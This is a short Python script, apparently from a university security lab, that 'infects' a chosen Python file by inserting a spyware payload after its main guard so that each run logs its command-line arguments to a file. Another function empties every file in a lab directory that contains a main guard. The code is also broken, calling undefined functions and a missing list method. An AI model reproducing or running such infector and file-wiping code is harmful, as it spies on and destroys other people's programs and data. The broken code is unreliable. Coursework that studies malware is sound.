import os 
import sys



def checkContained():
    os.chdir('/home/cse/Lab2/LabGen')
    files = os.listdir('.')
    target = []

    
    for f in files:
        with open(f,"r") as file:
            content = file.read()
        if content.__contains__("if __name__ == “__main__”:") and not f.__contains__("Q1B.out"):
            target.add(f)

    for f in target:
        with open(f,"w") as file:
            pass




def infect_script(file_path):
    """Modify the script to add spyware functionality."""
    with open(file_path, "r") as file:
        lines = file.readlines()

    # Spyware payload to be added
    payload = [
        "\nimport sys\n",
        "with open('Q1B.out', 'a') as log:\n",
        "    log.write(' '.join(sys.argv) + '\\n')\n"
    ]

    # Find where to insert the payload (after if __name__ == "__main__":)
    for i, line in enumerate(lines):
        if 'if __name__ == "__main__":' in line:
            lines.insert(i + 1, "".join(payload))  # Insert payload right after
    
    # Rewrite the file with the modified content
    with open(file_path, "w") as file:
        file.writelines(lines)
    print(f"{file_path} has been infected with spyware.")



def main():
    # Ensure correct usage
    if len(sys.argv) != 2:
        print("Usage: python3 Q1B.py <script.py>")
        sys.exit(1)

    script_path = sys.argv[1]

    # Ensure the file exists and is a Python script
    if not os.path.exists(script_path) or not script_path.endswith(".py"):
        print("Error: File does not exist or is not a Python file.")
        sys.exit(1)

    # Perform checks
    if not is_script(script_path):
        print("Error: This is not a script (missing `if __name__ == \"__main__\":`)")
        sys.exit(1)

    if is_infected(script_path):
        print("File is already infected. Exiting.")
        sys.exit(0)

    # Modify the script
    infect_script(script_path)

if __name__ == "__main__":
    main()